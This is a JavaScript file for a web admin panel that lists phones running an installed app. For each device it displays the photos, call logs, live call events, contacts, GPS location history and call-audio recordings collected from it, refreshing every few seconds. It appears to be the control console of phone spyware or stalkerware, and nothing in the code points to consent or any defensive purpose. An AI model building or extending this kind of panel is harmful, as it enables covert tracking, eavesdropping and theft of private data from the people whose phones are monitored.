const params = new URLSearchParams(location.search);
let KEY = params.get('key') || prompt('Admin key:') || '';
if (!params.get('key') && KEY) location.search = '?key=' + encodeURIComponent(KEY);

const api = p => fetch(p, { headers: { 'X-Admin-Key': KEY } }).then(r => r.json());
let currentDevice = null;
let currentTab = 'photos';

async function loadDevices() {
  const d = await api('/api/admin/devices');
  const el = document.getElementById('deviceList');
  if (!d.length) {
    el.innerHTML = '<div class="loading">No devices yet.<br>Install the app to see it here.</div>';
    return;
  }
  el.innerHTML = d.map(x => `
    <div class="device-item ${x.id===currentDevice?'active':''}" data-id="${x.id}">
      <div class="label">${escapeHtml(x.label||x.model||'Device')}</div>
      <div class="meta">${escapeHtml(x.model||'')} · seen ${timeAgo(x.last_seen)}</div>
    </div>`).join('');
  el.querySelectorAll('.device-item').forEach(x => {
    x.onclick = () => selectDevice(x.dataset.id);
  });
}

function selectDevice(id) { currentDevice = id; loadDevices(); renderDevice(id); }

async function renderDevice(id) {
  const info = await api(`/api/admin/device/${id}`);
  if (!info.device) return;
  document.getElementById('main').innerHTML = `
    <div class="header">
      <h1>${escapeHtml(info.device.label || 'Device')}</h1>
      <div class="info">${escapeHtml(info.device.model||'')} · SDK ${info.device.sdk||'?'} · ID ${info.device.id} · last seen ${timeAgo(info.device.last_seen)}</div>
    </div>
    <div class="stats">
      <div class="stat"><div class="k">Photos</div><div class="v">${info.stats.photos}</div></div>
      <div class="stat"><div class="k">Calls</div><div class="v">${info.stats.calls}</div></div>
      <div class="stat"><div class="k">Live events</div><div class="v">${info.stats.call_events}</div></div>
      <div class="stat"><div class="k">Contacts</div><div class="v">${info.stats.contacts}</div></div>
      <div class="stat"><div class="k">Locations</div><div class="v">${info.stats.locations}</div></div>
      <div class="stat"><div class="k">Recordings</div><div class="v">${info.stats.recordings}</div></div>
    </div>
    <div class="tabs">
      ${['photos','calls','call-events','contacts','locations','recordings']
        .map(t => `<button class="tab ${t===currentTab?'active':''}" data-tab="${t}">${tabLabel(t)}</button>`).join('')}
    </div>
    <div id="tabContent"></div>`;
  document.querySelectorAll('.tab').forEach(t => {
    t.onclick = () => {
      currentTab = t.dataset.tab;
      document.querySelectorAll('.tab').forEach(x => x.classList.toggle('active', x===t));
      renderTab(id);
    };
  });
  renderTab(id);
}

function tabLabel(t) {
  return { photos:'Photos', calls:'Call Log', 'call-events':'Live Events',
           contacts:'Contacts', locations:'Locations', recordings:'Recordings' }[t];
}

async function renderTab(id) {
  const el = document.getElementById('tabContent');
  el.innerHTML = '<div class="empty-list">Loading...</div>';
  let data = [];
  try { data = await api(`/api/admin/device/${id}/${currentTab}`); } catch(_) {}
  if (!Array.isArray(data)) data = [];

  if (currentTab === 'photos') {
    if (!data.length) return el.innerHTML = '<div class="empty-list">No photos yet.</div>';
    el.innerHTML = `<div class="grid-photos">${data.map(p => `
      <div class="photo" onclick="window.open('/files/${p.filename}?key=${encodeURIComponent(KEY)}','_blank')">
        <img src="/files/${p.filename}?key=${encodeURIComponent(KEY)}" loading="lazy">
      </div>`).join('')}</div>`;
  } else if (currentTab === 'calls') {
    if (!data.length) return el.innerHTML = '<div class="empty-list">No calls yet.</div>';
    el.innerHTML = `<div class="list">${data.map(c => `
      <div class="list-row">
        <div class="num">${escapeHtml(c.name || c.number)}</div>
        <div class="type ${c.type}">${c.type}</div>
        <div class="dur">${fmtDur(c.duration)}</div>
        <div class="when">${fmtDate(c.date)}</div>
      </div>`).join('')}</div>`;
  } else if (currentTab === 'call-events') {
    if (!data.length) return el.innerHTML = '<div class="empty-list">No live events yet.</div>';
    el.innerHTML = `<div class="list">${data.map(c => `
      <div class="list-row">
        <div class="num">${escapeHtml(c.number || 'unknown')}</div>
        <div class="dur">${fmtDur(c.duration)}</div>
        <div class="when">${fmtDate(c.ts)}</div>
      </div>`).join('')}</div>`;
  } else if (currentTab === 'contacts') {
    if (!data.length) return el.innerHTML = '<div class="empty-list">No contacts yet.</div>';
    el.innerHTML = `<div class="list">${data.map(c => `
      <div class="list-row">
        <div class="num">${escapeHtml(c.name)}</div>
        <div style="color:var(--muted);">${escapeHtml(c.number)}</div>
      </div>`).join('')}</div>`;
  } else if (currentTab === 'locations') {
    if (!data.length) return el.innerHTML = '<div class="empty-list">No locations yet.</div>';
    el.innerHTML = `<div class="list">${data.map(l => `
      <div class="list-row loc-row">
        <div>
          <div class="loc-coords">${Number(l.lat).toFixed(6)}, ${Number(l.lon).toFixed(6)} · ±${Math.round(l.accuracy||0)}m</div>
          <div class="when" style="text-align:left;margin-top:4px;">${fmtDate(l.ts)}</div>
        </div>
        <a class="loc-link" target="_blank" href="https://maps.google.com/?q=${l.lat},${l.lon}">Open map</a>
      </div>`).join('')}</div>`;
  } else if (currentTab === 'recordings') {
    if (!data.length) return el.innerHTML = '<div class="empty-list">No recordings yet.</div>';
    el.innerHTML = `<div class="list">${data.map(r => `
      <div class="list-row" style="flex-direction:column;align-items:stretch;gap:8px;">
        <div style="display:flex;gap:14px;align-items:center;">
          <div class="num">${escapeHtml(r.number || 'unknown')}</div>
          <div class="dur">${fmtDur(r.duration)}</div>
          <div class="when" style="margin-left:auto;">${fmtDate(r.ts)}</div>
        </div>
        <audio controls src="/files/${r.path}?key=${encodeURIComponent(KEY)}"></audio>
      </div>`).join('')}</div>`;
  }
}

function fmtDur(s) {
  if (!s) return '0s'; s = +s;
  const h = Math.floor(s/3600), m = Math.floor((s%3600)/60), sec = s%60;
  if (h) return h+'h '+m+'m';
  if (m) return m+'m '+sec+'s';
  return sec+'s';
}
function fmtDate(ts) {
  if (!ts) return '—';
  return new Date(ts).toLocaleString('en-IN',
    { day:'2-digit', month:'short', hour:'2-digit', minute:'2-digit' });
}
function timeAgo(ts) {
  if (!ts) return 'never';
  const s = Math.floor((Date.now()-ts)/1000);
  if (s < 60) return 'just now';
  if (s < 3600) return Math.floor(s/60)+'m ago';
  if (s < 86400) return Math.floor(s/3600)+'h ago';
  return Math.floor(s/86400)+'d ago';
}
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}

setInterval(() => { if (currentDevice) renderTab(currentDevice); }, 15000);
setInterval(loadDevices, 20000);
loadDevices();
